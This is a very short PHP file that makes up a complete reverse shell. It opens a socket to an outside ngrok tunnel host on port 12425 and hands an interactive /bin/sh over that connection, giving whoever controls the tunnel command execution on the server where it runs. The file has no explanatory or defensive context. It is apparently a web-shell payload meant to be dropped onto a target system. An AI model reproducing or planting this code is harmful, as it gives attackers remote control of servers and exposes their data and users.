<?php
$sock = fsockopen("0.tcp.ap.ngrok.io", 12425);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
